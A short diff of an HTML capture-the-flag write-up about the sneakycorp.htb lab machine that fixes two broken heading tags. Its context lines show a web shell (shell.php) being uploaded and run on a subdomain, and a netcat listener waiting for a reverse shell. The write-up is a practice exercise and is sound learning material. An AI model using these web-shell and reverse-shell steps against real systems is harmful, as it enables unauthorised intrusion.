@@ -75,7 +75,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1080.13 sec</pre>
 <p>At the end of the scan you can see the domain so we need to add it. add <code class="language-plaintext highlighter-rouge">sneakycorp.htb</code> to /etc/hosts file </p>
 </blockquote>  
 
-<h1>Port 80<h2>
+<h1>Port 80</h1>
 <blockquote>  
 <p>Let`s see what we can find.</p>
 </blockquote>  
@@ -279,7 +279,7 @@ local: shell.php remote: shell.php
 <blockquote><p>Lol, it is a subdomain that was easy. You can use a lot of tools to get subdomain and you can be lucky 😂</p>
 <p>let`s upload the shell and execute it from http://dev.sneakycorp.htb/shell.php </p>  
 </blockquote>
-<h1>Shell<h2>
+<h2>Shell</h2>
 <pre>➜  m19o rlwrap nc -nlvp 1234 
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::1234
